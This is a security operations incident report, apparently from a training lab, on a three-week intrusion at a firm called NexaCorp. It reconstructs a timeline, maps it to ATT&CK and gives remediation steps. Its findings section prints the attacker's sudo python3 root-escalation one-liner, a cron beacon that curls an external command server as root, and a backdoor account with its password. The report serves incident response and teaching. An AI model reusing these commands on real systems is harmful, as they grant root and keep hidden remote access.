# NEXACORP INDUSTRIES — Month 1 Assessment Report

INC-2026-001 · INC-2026-002 · INC-2026-003

| **Field** | **Detail** |
|---|---|
| Prepared by | BeCode Corp SOC |
| Analyst | Zoltan Frenyo (SOC Analyst) |
| Reviewed by | Sarah Chen, Senior SOC Analyst |
| Submission date | May 29, 2026 |
| Classification | Confidential — NexaCorp management only |
| Incidents covered | INC-2026-001, INC-2026-002, INC-2026-003 |

---

## 1. Executive Summary

Over the past three weeks, an attacker broke into two of NexaCorp's internal servers. This did not happen all at once; each week, the attacker used what they had learned the week before to go a step further. By the time NexaCorp's sysadmin noticed something was wrong on Sunday afternoon, the attacker had already been inside the second server for about two hours and had set up a connection that kept running automatically in the background.

It started with a known security flaw in the file transfer service on the Liège server (INC-2026-001). The attacker used that flaw to get in. The following week, they moved to the Brussels application server (INC-2026-002), where a configuration mistake let them gain full administrative access — meaning they could do anything on that machine. While they were there, they copied a private key that belonged to an internal automation account.

In the third week (INC-2026-003), they used that copied key to log into the Liège file server, pretending to be the legitimate automation account. A second configuration mistake on that server — a rule that allowed the account to run admin commands without a password — gave them full control within minutes. Between 12:39 and 13:05 on Sunday May 24, they created a hidden admin account and set up a scheduled task that contacts an external server every five minutes. That task was still running when this investigation started.

Right now, NexaCorp faces two active risks. First, the Liège file server is still sending automatic check-ins to an address controlled by the attacker, a connection that could be used at any time to run commands remotely or pull data out. Second, during the attack the attacker opened a file called `db-credentials.env`, which by its name stores database login details. Any system that uses those credentials should be considered at risk until the passwords are changed.

This does not look like a random attack. The attacker was patient, moved carefully, and followed the same approach across all three incidents — get in, get admin access quietly, leave a backdoor, move on. That kind of pattern points to a deliberate, targeted campaign by one person or group, not an automated script that happened to find an open door. All three incidents should be treated as one connected attack.

### Current Threat State — May 29, 2026

| **C2 BEACON** Still firing every 5 min to 34.251.89.142 | **BACKDOOR ACCOUNT** sysupdate present on lge-files-01 | **CREDENTIALS AT RISK** db-credentials.env was opened | **BRU-APP-01** it_support account removal unconfirmed |
|---|---|---|---|

---

## 2. INC-2026-003 — Incident Timeline

All timestamps are CEST (UTC+2). The attack window ran from 12:31 to 13:05 on Sunday, May 24, 2026. Highlighted rows are the four key pivot points.

| **Time (CEST)** | **Source** | **Event** |
|---|---|---|
| 12:31:07 | bru-app-01/auth.log | Attacker SSH login as `it_support` from 185.220.101.62 (external) |
| 12:31:22 | bru-app-01/auth.log | Escalates to root via `sudo /bin/bash` |
| 12:35:44 | bru-app-01/auth.log | Searches all home directories for SSH private keys (`find /home /root -name id_rsa`) |
| 12:36:19 | bru-app-01/auth.log | Reads `/home/svc_api/.ssh/id_rsa` — key stolen |
| 12:36:51 | bru-app-01/auth.log | Reads `svc_backup` authorized_keys to confirm the target |
| 12:37:03 | bru-app-01/auth.log | Runs `ssh-keygen -y` to verify key is valid |
| 12:38:29 | bru-app-01/auth.log | Copies key to `/tmp/.cache` — staged for use |
| **12:39:54** | sshd_journal.log | **SSH login to lge-files-01 as svc_backup using harvested key — PIVOT** |
| 12:39:55 | audit_filtered.log | Runs `id`, `whoami`, `hostname` — attacker gets their bearings |
| 12:40:08 | sudo_journal.log | `sudo id` — tests sudo access, succeeds without password |
| 12:40:17 | sudo_journal.log | `sudo cat /etc/sudoers` — reads full sudo configuration |
| **12:40:51** | sudo_journal.log | **`sudo python3 -c` to run useradd as root — PRIVILEGE ESCALATION** |
| 12:40:52 | syslog | Account `sysupdate` created, added to sudo group |
| 12:41:00 | sudo_journal.log | Writes `/etc/cron.d/system-update` — C2 cron job installed |
| 12:43–12:48 | sudo_journal.log | Browses `/data`, reads `nexacorp-sync.conf` and `db-credentials.env` |
| 12:45:01 | syslog | First cron beacon fires — outbound connection to 34.251.89.142 |
| 13:05:31 | sshd_journal.log | Attacker session closed (total duration: 25 min 37 sec) |
| 14:31+ | sudo_journal.log | m.dubois discovers both persistence mechanisms |

---

## 3. Technical Findings — INC-2026-003

### 3.1 Lateral Movement Method

The attacker authenticated to lge-files-01 by impersonating the `svc_backup` service account using a harvested SSH private key. The source IP (192.168.10.20, bru-app-01) and the key fingerprint both differ from every legitimate `svc_backup` connection seen throughout the day.

| **Field** | **Detail** |
|---|---|
| Source IP | 192.168.10.20 (bru-app-01) |
| Account used | svc_backup |
| Authentication method | SSH public key — using svc_api's harvested private key |
| Key fingerprint (attacker) | Cx3hNuyZ…Qg4 |
| Key fingerprint (legitimate) | mHj4kL9p…mNo0 (monitoring agent, mon-01) |
| Timestamp | 12:39:54 CEST, May 24, 2026 |
| ATT&CK technique | T1021.004 — Remote Services: SSH |

The key worked because `svc_api`'s public key was already listed in `svc_backup`'s `authorized_keys` file on lge-files-01 — a legitimate trust relationship between two service accounts that the attacker turned into an attack path.

### 3.2 Privilege Escalation Vector

The sudoers configuration on lge-files-01 contained the following rule:

```
svc_backup  ALL=(root) NOPASSWD: /usr/bin/python3
```

This grants unrestricted root access to anyone logged in as `svc_backup`. By passing OS commands through Python's `os.system()` call, the attacker ran arbitrary commands as root without ever opening an interactive root shell:

```bash
sudo python3 -c 'import os; os.system("useradd -m -s /bin/bash sysupdate ...")'
```

Because the entire escalation happened inside a single sudo invocation with no interactive shell, it left no root shell session in the logs — making it harder to detect in real time. The decoded audit log (EXECVE records) is what reveals the full command chain.

ATT&CK: **T1548.003 — Abuse Elevation Control Mechanism: Sudo and Sudo Caching**

The correct fix is to restrict the rule to a specific, non-writable script path rather than the interpreter itself. Granting NOPASSWD access to any interpreter (python3, perl, bash, ruby) is equivalent to granting full root.

### 3.3 Persistence Mechanisms

**Mechanism 1 — Backdoor Account (T1136.001)**

| **Field** | **Detail** |
|---|---|
| Created at | 12:40:52 CEST |
| Username | sysupdate |
| Password | Backd00r! |
| UID / GID | 1002 |
| Shell | /bin/bash |
| Groups | sudo (full admin access) |
| Status | Still present unless removed |
| Removal | `userdel -r sysupdate` |

**Mechanism 2 — Cron C2 Beacon (T1053.003 + T1071.001)**

File written: `/etc/cron.d/system-update`

```bash
*/5 * * * *  root  /bin/bash -c "curl -s http://34.251.89.142/update?h=lge-files-01 -o /dev/null; echo beacon-$(date +%s) >> /tmp/.update.log"
```

| **Field** | **Detail** |
|---|---|
| Created at | 12:41:00 CEST |
| First execution | 12:45:01 CEST |
| Frequency | Every 5 minutes as root |
| Destination | http://34.251.89.142/update?h=lge-files-01 |
| Server response | HTTP 200 OK, empty body (nginx/1.18.0) |
| Executions on May 24 | 48 confirmed in syslog (12:45 to 18:40) |
| Network confirmation | 4 GET/200 exchanges captured in lab03_capture.pcap |
| Status | Still running at time of report |
| Removal | `rm /etc/cron.d/system-update` + `rm /tmp/.update.log` |

The `?h=lge-files-01` parameter identifies the victim to the attacker's server, suggesting organised C2 infrastructure managing multiple hosts. The empty response body during the capture window is consistent with a check-in beacon — future responses could deliver commands.

---

## 4. Kill Chain Reconstruction — INC-2026-001 Through INC-2026-003

All three incidents are one connected attack by the same actor. Each incident used what the previous one obtained.

| **Incident** | **What happened** | **ATT&CK** | **What attacker gained** |
|---|---|---|---|
| INC-2026-001 Week 1 | Known FTP backdoor on Liège services server | T1190 — Exploit Public-Facing Application | Initial foothold on NexaCorp network |
| INC-2026-002 Week 2 | Pivot to bru-app-01, SUID privesc to root, shadow file read, backdoor account (it_support), SSH key harvest | T1078, T1548, T1552.004 | Root on bru-app-01 + svc_api private key |
| INC-2026-003 Week 3 | Pivot to lge-files-01 using harvested key, sudo python3 privesc, backdoor account + cron C2 | T1021.004, T1548.003, T1136.001, T1053.003, T1071.001 | Root on lge-files-01 + active C2 |

**The Connecting Artefact**

The private key at `/home/svc_api/.ssh/id_rsa` on bru-app-01 was stolen at 12:36:19 and used to authenticate to lge-files-01 at 12:39:54 — a gap of 3 minutes and 35 seconds. The key worked because `svc_api`'s public key was already trusted by `svc_backup` on the file server, a legitimate cross-service relationship that the attacker found and exploited.

**Evidence of a Single Actor**

- Consistent use of `python3 -c` one-liners to run OS commands without writing script files to disk
- Same cron-based HTTP beacon pattern across incidents
- Methodical recon before acting — read sudoers before escalating, checked authorized_keys before pivoting
- Backdoor account naming convention designed to blend in: `it_support` (INC-002), `sysupdate` (INC-003)
- C2 infrastructure on 34.251.89.142 using nginx with hostname-based victim tracking

---

## 5. Recommendations

### Immediate — This Week

**R1 — Remove the two persistence mechanisms on lge-files-01**

Delete the cron file and remove the backdoor account. This must be done first — the cron job is actively running.

```bash
rm /etc/cron.d/system-update
rm /tmp/.update.log
userdel -r sysupdate
```

Also confirm that the `it_support` backdoor account from INC-2026-002 has been removed from bru-app-01.

**R2 — Block outbound traffic to 34.251.89.142 at the firewall**

Even after the cron job is deleted, block that IP at the network level as a safety net. Internal servers should not be making outbound HTTP connections to unknown external addresses — this is worth reviewing as a general policy for all servers.

**R3 — Rotate the credentials in db-credentials.env immediately**

The attacker opened that file during the attack. We cannot confirm whether the contents were copied, so we have to assume they were. Change the passwords for any database or service that uses those credentials before the end of the week.

### Short-Term — Within 30 Days

**R4 — Fix the sudo misconfiguration on lge-files-01 and audit all servers**

Replace the current rule with one that only allows the specific backup script that `svc_backup` actually needs to run:

```bash
# Current (dangerous):
svc_backup  ALL=(root) NOPASSWD: /usr/bin/python3

# Replace with:
svc_backup  ALL=(root) NOPASSWD: /opt/scripts/backup.py
```

Run `sudo -l` on every server and look for any account that has NOPASSWD access to an interpreter (python3, perl, bash, ruby). Those are all the same problem.

**R5 — Review and clean up SSH key trust relationships between service accounts**

Check the `~/.ssh/authorized_keys` file for every service account on every server. Remove any key that does not have a clear, documented reason to be there. Service accounts should only be able to connect to the specific servers they actually need — nothing more.

### Medium-Term — 1 to 3 Months

**R6 — Set up basic alerting for things that should never happen quietly**

The attacker ran for three weeks and was only noticed because a sysadmin happened to look at the right file on a Sunday afternoon. A small set of simple alerts would have caught this much earlier:

- Any new user account created on a server
- Any new file written to `/etc/cron.d`
- Any outbound connection from a server to an external IP it has never contacted before
- Any SSH login from an unexpected source IP

These do not require expensive tools. Auditd is already running on lge-files-01 and most of this can be done with log monitoring and a few email alerts.

---

## 6. Appendix — Evidence References

| **File** | **Key content and relevant entries** |
|---|---|
| bru-app-01/auth.log | Full SSH and PAM authentication log — May 24. Key entries at 12:31–12:38 (attacker preparation and key harvest). |
| lge-files-01/sshd_journal.log | SSH daemon log — full day. Anomalous connection at 12:39:54 from 192.168.10.20. |
| lge-files-01/sudo_journal.log | All privileged commands. Complete attacker command sequence 12:40:08 to 12:48:55. m.dubois discovery at 14:31+. |
| lge-files-01/audit_filtered.log | auditd execution log. EXECVE records with hex-encoded arguments decoded to reveal full OS command chain. `auid=1000` used to separate attacker activity from system processes. |
| lge-files-01/syslog | System log — full day. `useradd` events at 12:40:52, cron beacon executions from 12:45:01 onwards (48 entries). |
| pcap/lab03_capture.pcap | Network capture. 36 packets to/from 34.251.89.142. 4 complete HTTP GET/200 exchanges confirmed (10:45–11:00 UTC = 12:45–13:00 CEST). |

---

*INC-2026-003 — Month 1 Assessment Report | BeCode Corp SOC | May 29, 2026*
